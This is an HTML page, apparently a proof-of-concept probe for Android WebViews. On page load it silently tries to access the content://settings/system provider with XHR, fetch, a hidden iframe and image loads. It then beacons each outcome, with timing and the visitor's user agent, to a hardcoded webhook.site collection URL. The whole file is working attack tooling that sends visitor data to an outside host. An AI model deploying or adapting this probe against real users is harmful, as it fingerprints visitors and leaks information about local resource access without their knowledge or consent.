<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Fixed Probe</title>
</head>
<body>
<h3>Probe Running (Fixed)...</h3>

<script>
const CONFIG = {
    TARGET: "content://settings/system",
    CONTROL: "https://example.com/",
    WEBHOOK: "https://webhook.site/#!/view/6d1cbc58-73bd-46b8-8e6c-318aaf917a6e"
};

// 🔥 FIX: gunakan image beacon (lebih reliable)
function report(data) {
    const payload = btoa(JSON.stringify({
        time: Date.now(),
        ua: navigator.userAgent,
        ...data
    }));

    const img = new Image();
    img.src = CONFIG.WEBHOOK + "?d=" + payload;

    // fallback fetch (optional)
    fetch(CONFIG.WEBHOOK, {
        method: "POST",
        mode: "no-cors",
        body: payload
    }).catch(()=>{});
}

// ========== XHR ==========
function testXHR(url, label) {
    const start = performance.now();
    const xhr = new XMLHttpRequest();

    xhr.open("GET", url, true);

    xhr.onloadend = function() {
        report({
            type: "XHR",
            label,
            status: xhr.status,
            duration: performance.now() - start
        });
    };

    xhr.onerror = () => report({ type: "XHR_ERROR", label });

    try { xhr.send(); }
    catch(e) { report({ type: "XHR_EXCEPTION", label }); }
}

// ========== FETCH ==========
async function testFetch(url, label) {
    const start = performance.now();
    try {
        await fetch(url, { mode: "no-cors" });
        report({
            type: "FETCH_DONE",
            label,
            duration: performance.now() - start
        });
    } catch (e) {
        report({ type: "FETCH_ERROR", label });
    }
}

// ========== IFRAME ==========
function testIframe(url, label) {
    const iframe = document.createElement("iframe");
    iframe.style.display = "none";

    let triggered = false;

    iframe.onload = () => {
        triggered = true;
        report({ type: "IFRAME_LOAD", label });
    };

    setTimeout(() => {
        if (!triggered) {
            report({ type: "IFRAME_TIMEOUT", label });
        }
    }, 3000);

    iframe.src = url;
    document.body.appendChild(iframe);
}

// ========== IMAGE ==========
function testImage(url, label) {
    const img = new Image();

    img.onload = () => report({ type: "IMG_LOAD", label });
    img.onerror = () => report({ type: "IMG_ERROR", label });

    img.src = url;
}

// ========== RUN ==========
window.onload = () => {
    const tests = [
        [CONFIG.TARGET, "TARGET"],
        [CONFIG.CONTROL, "CONTROL"]
    ];

    tests.forEach(([url, label]) => {
        setTimeout(() => testXHR(url, label), 100);
        setTimeout(() => testFetch(url, label), 300);
        setTimeout(() => testIframe(url, label), 600);
        setTimeout(() => testImage(url, label), 900);
    });
};
</script>

</body>
</html>
